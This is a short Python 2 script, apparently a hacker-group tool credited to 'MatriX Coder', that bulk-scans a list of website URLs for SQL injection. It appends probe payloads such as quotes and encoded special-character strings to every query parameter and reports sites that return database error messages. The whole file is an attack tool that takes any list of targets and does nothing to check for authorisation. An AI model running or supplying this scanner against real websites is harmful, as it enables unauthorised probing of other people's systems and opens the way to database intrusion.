#!/usr/bin/env python

# server websites sqli injection checker
# v1.2 detecting parameters 
# Got Some codes and ideas from WebPwn3r Project (a good one)

import urllib2 , os , sys , re
from platform import system

class colors():
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'

if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')

logo = '''
   _____ ____    __    _
  / ___// __ \  / /   (_) | ----| SQLi Checker |----
  \__ \/ / / / / /   / /  | Autohr : MatriX Coder
 ___/ / /_/ / / /___/ /   | FB : www.fb.com/matrixcoder2
/____/\___\_\/_____/_/    | Blog : www.matrixcoder.co.vu


'''

print(colors.BLUE + logo + colors.ENDC)

try:
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    with open(sys.argv[1], 'r') as f:
        sis = f.readlines()
        for site in sis:
            site = site.rstrip()
            vulnz = []
            try:
                for param in site.split('?')[1].split('&'):
                    for payload in payloads:
                        pows = site.replace(param , param + payload.strip())
                        print pows
                        html = urllib2.urlopen(pows).readlines()
                        for line in html:
                            checker = re.findall(check , line)
                            if len(checker) != 0 and site not in vulnz:
                                vulnz.append(site)
                                print colors.GREEN + '\nSQLi Found ==> %s\n' % site + colors.ENDC
            except:
                pass
        
except IndexError:
    print "[*] Usage : python "+sys.argv[0]+" file.txt"